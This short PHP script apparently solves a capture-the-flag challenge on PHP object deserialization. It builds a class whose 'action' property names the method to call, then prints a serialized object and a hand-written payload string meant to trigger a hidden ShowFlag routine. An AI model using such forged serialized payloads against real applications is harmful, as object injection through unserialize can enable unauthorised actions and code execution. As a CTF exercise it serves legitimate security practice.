/*
 * Created by PhpStorm.
 * User: wenhuizone
 * Date: 2015/11/29
 * Time: 15:08
*/
<?php

class RandomClass {
    private static $instance;
    private $uStruct;
    public function __construct(){
        $this->uStruct = (object)array();
    }
    public static function GetInstance() {
        if(!isset(self::$instance)) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    public function __set($key, $value){
        $this->uStruct->$key = $value;
    }

    public function __get($key){
        return $this->uStruct->$key;
    }

    public function DoAction(){
        $action = $this->uStruct->action;
        $this->$action();
    }

    public function GetCurrentDate(){
        GetCurrentDate($this->uStruct);
    }

    public function ShowFlag(){
        if($this->uStruct->time !== null && $this->uStruct->flag == 'Please?'){
            ShowFlag($this->uStruct);
        }
    }

    public function GetOutput(){
        return $this->uStruct->output;
    }
}
$a=new RandomClass();
$a->time=144000111;
$a->flag='Please?';
$a->action=ShowFlag;
echo serialize($a);
echo 'O:11:"RandomClass":1:{s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":1:{s:6:"action";s:8:"ShowFlag";}}';
?>